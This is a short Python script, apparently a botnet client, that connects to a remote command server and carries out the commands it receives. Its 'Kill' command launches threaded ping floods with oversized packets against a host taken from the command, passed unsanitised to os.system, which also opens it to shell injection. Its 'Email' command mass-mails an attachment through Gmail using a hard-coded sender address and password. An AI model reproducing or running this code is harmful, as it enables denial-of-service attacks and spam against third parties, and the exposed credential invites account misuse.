import socket
import threading
import subprocess
import os
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

EnFonction = True

def thread_recevoir(client_socket):
    while True:
        global EnFonction
        print("on attend")
        reponse = client_socket.recv(1024).decode()
        print("recu")
        print(reponse)
        text = reponse.split()
        print(text[0])
        if (text[0] == 'Kill'):
            EnFonction = True
            print("yolo")
            for i in range(0, 8):
                allo = threading.Thread(target=thread_ping, args=(text[1],))
                allo.start()
        if (text[0] == 'Email'):
            subject = "An email with attachment from Python"
            body = "This is an email with attachment sent from Python"
            sender_email = "hugospam990@gmail.com"
            receiver_email = "willor20@gmail.com"
            password = "ShanyCarleLove"

            # Create a multipart message and set headers
            message = MIMEMultipart()
            message["From"] = sender_email
            message["Subject"] = subject
            message["Bcc"] = receiver_email  # Recommended for mass emails

            # Add body to email
            message.attach(MIMEText(body, "plain"))

            filename = "email.txt"  # In same directory as script

            # Open PDF file in binary mode
            with open(filename, "rb") as attachment:
                # Add file as application/octet-stream
                # Email client can usually download this automatically as attachment
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())

            # Encode file in ASCII characters to send by email
            encoders.encode_base64(part)

            # Add header as key/value pair to attachment part
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {filename}",
            )

            # Add attachment to message and convert message to string
            message.attach(part)
            text = message.as_string()

            # Log in to server using secure context and send email
            f = open("email.txt", "r")
            for x in f:
                message["To"] = x
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(sender_email, password)
                    server.sendmail(sender_email, x, text)
        if (text[0] == 'Stop'):
            EnFonction = False




def thread_ping(rest):
    global EnFonction
    while EnFonction:
        hostname = "69.69.69.69"  # example
        subprocess.call(['ping', "-l", "65500", "-w", "1", "-n", "1", hostname])
        response = os.system("ping -c 3 " + rest)


server_ip = "69.69.69.69"
serveur_port = 4200

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, serveur_port))
thread_recevoir2 = threading.Thread(target=thread_recevoir, args={client, })

thread_recevoir2.start()

while True:
    texte = input()
    client.send(str.encode(texte))